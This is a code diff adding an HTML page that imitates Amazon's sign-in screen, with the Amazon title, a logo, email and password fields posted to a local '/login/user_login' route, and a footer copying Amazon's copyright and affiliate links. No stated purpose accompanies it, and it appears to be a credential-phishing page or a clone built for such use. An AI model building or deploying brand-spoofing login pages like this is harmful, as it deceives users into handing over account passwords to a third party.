@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon login</title>
+  <!-- Replace the URL with the actual Bootstrap CDN link -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <link rel="stylesheet" type="text/css" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <center><img src="data:image/png;base64,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" alt="Logo" width="150" height="100" class="d-inline-block align-text-top"></center>
+    <div class="row justify-content-center">
+      <div class="col-md-6">
+        <div class="card mt-5">
+          <div class="card-header text-white text-center">
+            <h3>Amazon Login</h3>
+          </div>
+          <div class="card-body">
+            <form action="/login/user_login" method="POST">
+              <div class="form-group">
+                <label for="email">Email:</label>
+                <input type="email" class="form-control" id="email" name="email" required>
+              </div>
+              <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" class="form-control" id="password" name="password" required>
+              </div>
+              <button type="submit" class="btn btn-warning btn-block">Login</button>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <footer>
+    <p>© 1996-2023, Amazon.com, Inc. or its affiliates<br>
+    <a href="#"> Amazon Web Services </a>
+    <a href="#"> AbeBooks </a>
+    <a href="#"> ShopBop </a>
+    <a href="#"> Amazon Business </a>
+    <a href="#"> Audible </a>
+    <a href="#"> DPReview </a>
+    <a href="#"> Amazon Prime Music </a>
+    <a href="#"> Prime Now </a>
+    <a href="#"> IMDb</a></p>
+  </footer>
+  <!-- Replace the URL with the actual Bootstrap CDN link -->
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.6.0/dist/umd/popper.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+</body>
+</html>
